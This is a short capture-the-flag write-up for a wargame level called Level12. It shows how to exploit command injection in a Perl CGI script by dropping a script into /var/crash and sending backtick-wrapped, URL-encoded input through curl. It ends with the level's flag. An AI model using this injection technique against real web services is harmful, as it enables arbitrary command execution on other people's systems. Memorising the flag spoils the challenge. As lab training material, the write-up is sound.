# Level12

## Context
We found `level12.pl` perl executable file in our home.

We can use it this way : `curl localhost:4646/level12.pl/?x=text`

## Resolution
 * The file get's our parameter X, keeps the part before the first whitespace and put everything in uppercase, which is then passed inside this line:
 ```
   @output = `egrep "^$xx" /tmp/xd 2>&1`;
 ```

we can abuse the backticks
 * Let's first create an uppercase file `GETFLAG` in `/var/crash/` whith execute rights
 ```sh
echo "getflag > /var/crash/level12_output.txt" > /var/crash/GETFLAG
chmod +x /var/crash/GETFLAG
 ```
 * we want to execute: 
 ```sh
 curl localhost:4646/level12.pl?x=\`/\*/\*/getflag\` 
 ```
 but it needs to be encoded, we can use this site : https://meyerweb.com/eric/tools/dencoder/
 * which gives us: `curl localhost:4646/level12.pl?x=%60%2F*%2F*%2Fgetflag%60`
 * If we `cat /var/crash/level12_output.txt` we get the flag: `g1qKMiRpXf53AWhDaU7FEkczr`
